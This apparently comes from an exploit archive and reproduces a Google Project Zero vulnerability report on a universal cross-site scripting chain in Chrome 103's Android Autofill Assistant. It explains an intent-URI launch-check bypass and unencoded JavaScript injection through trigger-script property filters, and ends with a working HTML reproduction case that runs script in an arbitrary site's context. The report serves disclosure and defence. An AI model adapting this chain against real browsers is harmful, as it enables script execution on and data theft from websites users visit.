@@ -1,0 +1,152 @@
+id: 38022
+date: 10/04/2022
+title: Google Chrome 103.0.5060.53 Autofill Assistant Universal Cross Site Scripting Vulnerability
+author: Glazvunov
+cves: 
+
+Chrome: Universal XSS in Autofill Assistant
+
+VULNERABILITY DETAILS
+From the Autofill Assistant README file[1]:
+
+Autofill Assistant is an execution engine to run user journeys on websites given a set of actions. These actions include clicking on buttons or scrolling to an element. They also provide a way to interact with the user or get input to advance in the flow.
+
+This report describes a chain of issues in the implementation of the assistant that allows a malicious attacker to execute JavaScript code in the context of an arbitrary website.
+
+1. Launch Check Bypass
+
+There are several ways to launch a user journey i.e. to activate the assistant on a specific web page. From an attacker's point of view, the most interesting one is via Android intent:// URIs. To run the assistant, a web page simply needs to initiate navigation to a special URI. However, `ExternalNavigationHandler::handleWithAutofillAssistant()` is only meant to launch the journey if the navigation request comes from a web page in a subdomain of google.com i.e. a trusted source[2]. Unfortunately, if you look at the source code of `ExternalNavigationHandler::isGoogleReferrer()`[3], you'll notice that it actually only checks whether the main frame of the tab that's being navigated currently hosts a google.com page. This means the attacker can bypass the check by opening a google.com page first and then navigating it to the intent URI. This action doesn't violate the same-origin policy.
+
+```
+w = open(\"https://google.com/\");
+setTimeout(() => w.location = \"intent://...\", 1000);
+
+```
+
+Another way to bypass the check is by putting a regular https:// link somewhere on google.com to the attacker-controlled website and configuring the attacker's web server to reply with an HTTP redirect to the intent:// URI.
+
+It's not clear whether the intended (rather than actual) checks are still too coarse-grained. Can an intent link be hosted on a user-controlled page in a subdomain of google.com, for example, via Google Sites? Can a third-party Android app launch the intent directly?
+
+2. Parameter Manipulation
+
+Autofill Assistant intent URIs include the address of the target web page, as well as script parameters, which the attacker can arbitrarily modify. Some of the parameters, like `DISABLE_RPC_SIGNING`[4] or `PASSWORD_CHANGE_USERNAME`, seem to have security impact. Also, the `DETAILS_*` parameter group allows the attacker to show a partially-controlled native-looking user interface on top of websites that have associated user journeys.
+
+If, at the moment, only Google is allowed to create these URIs, could signature checking be added to prevent arbitrary manipulation of the script parameters?
+
+3. Trigger Script Injection
+
+The most promising parameter is called `TRIGGER_SCRIPTS_BASE64`. It lets the attacker overwrite the backend's trigger script response[5]. Trigger scripts are lightweight scripts that may launch the regular journey flow once a certain set of conditions is met on the page. In addition, they can show a basic provisional user interface.
+
+Since the trigger condition definition language is powerful enough, for example, to perform a regex match on a specific property of a specific page element, and certain trigger actions, like loading a picture from an external server, may be visible to the attacker, a custom trigger script may be used to exfiltrate data from a web page character by character.
+
+A trigger script response can be overridden for any website, not just the ones that are currently supported by Autofill Assistant. Also, a user is shown a consent dialog when they attempt to use the assistant for the first time, but trigger scripts are executed without any user interaction.
+
+4. JavaScript Injection Via Property Filter
+
+`JsFilterBuilder` translates trigger conditions defined by a script into JavaScript code, which is then executed in the context of the target web page. The builder properly encodes all of its inputs, using functions like `AddArgument`[6] and making sure it's impossible to corrupt the generated function and execute arbitrary code, with one unfortunate exception:
+
+```
+message PropertyFilter {
+  // The property to filter against.
+  optional string property = 1;
+
+  oneof value {
+    TextFilter text_filter = 2;
+    AutofillValueRegexp autofill_value_regexp = 3;
+  }
+}
+
+```
+
+The code that translates `PropertyFilter` simply concatenates the property name parameter, skipping the encoding[7]:
+
+```
+bool JsFilterBuilder::AddFilter(const SelectorProto::Filter& filter) {
+[...]
+    case SelectorProto::Filter::kProperty:
+      AddRegexpFilter(filter.property().text_filter(),
+                      filter.property().property());
+[...]
+}
+
+void JsFilterBuilder::AddRegexpFilter(const TextFilter& filter,
+                                      const std::string& property) {
+  std::string re_var = AddRegexpInstance(filter);
+  AddLine({\"elements = elements.filter((e) => \", re_var, \".test(e.\", property,
+           \"));\"});
+}
+
+```
+
+As a result, the attacker can run arbitrary JavaScript with a trigger script like the following:
+
+```
+trigger_scripts {
+  trigger_condition {
+    selector {
+      filters { css_selector: \"*\" }
+      filters {
+        property {
+          property: \"a+alert(location)\"
+          text_filter {
+            re2: \"\"
+          }
+        }
+      }
+    }
+  }
+}
+
+```
+
+which gets translated into:
+
+```
+elements = elements.filter((e) => v1.test(e.a + alert(location)));
+
+```
+
+[1] https://source.chromium.org/chromium/chromium/src/+/main:components/autofill_assistant/
+[2] https://source.chromium.org/chromium/chromium/src/+/main:chrome/android/java/src/org/chromium/chrome/browser/externalnav/ExternalNavigationDelegateImpl.java;drc=4c4e66a10a1895d8be8b8978f938eb698ff93492;l=323
+[3] https://source.chromium.org/chromium/chromium/src/+/main:components/external_intents/android/java/src/org/chromium/components/external_intents/ExternalNavigationHandler.java;drc=4c4e66a10a1895d8be8b8978f938eb698ff93492;l=2098
+[4] https://source.chromium.org/chromium/chromium/src/+/main:components/autofill_assistant/browser/script_parameters.cc;drc=4c5a895bed6c12687227f92c8d66dfb0bfb03225;l=111
+[5] https://source.chromium.org/chromium/chromium/src/+/main:components/autofill_assistant/browser/service.proto;drc=39e992a5452136dd9944c9c957245e3f88885e71;l=783
+[6] https://source.chromium.org/chromium/chromium/src/+/main:components/autofill_assistant/browser/web/js_filter_builder.cc;drc=9e3fd1a0c143cf14101c1abcb4c98345bcaf9890;l=197
+[7] https://source.chromium.org/chromium/chromium/src/+/main:components/autofill_assistant/browser/web/js_filter_builder.cc;drc=9e3fd1a0c143cf14101c1abcb4c98345bcaf9890;l=189
+
+VERSION
+Google Chrome 103.0.5060.53 (Official Build)
+
+REPRODUCTION CASE
+```
+<body>
+<h1>Click me</h1>
+<script>
+NS = \".org.chromium.chrome.browser.autofill_assistant.\";
+TARGET_URL = \"https://google.com/\";
+
+onclick = () => {
+  w = open(\"https://google.com/\");
+  setTimeout(() => {
+  w.location = `intent://a/#Intent;
+    scheme=http;
+    S.browser_fallback_url=${escape(TARGET_URL)};
+    B${NS}ENABLED=true;
+    B${NS}START_IMMEDIATELY=false;
+    S${NS}TRIGGER_SCRIPTS_BASE64=CiQKIkIgSgMSASpKGXIXChFhK2FsZXJ0KGxvY2F0aW9uKRICCgA=;
+    end`.replace(/\\s/g, \"\");
+  }, 1000);
+}
+</script>
+</body>
+
+```
+
+CREDIT INFORMATION
+Sergei Glazunov of Google Project Zero
+
+This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline, this bug report will become public 30 days after the fix was made available. Otherwise, this bug report will become public at the deadline. The scheduled deadline is 2022-09-22.
+
+Please note that, according to our disclosure policy, if Project Zero discovers a variant of a previously reported Project Zero bug, technical details of the variant will be added to the existing Project Zero report (which may be already public) and the report will not receive a new deadline. For more details, see https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html.
+
+#  0day.today [2023-03-27]  #
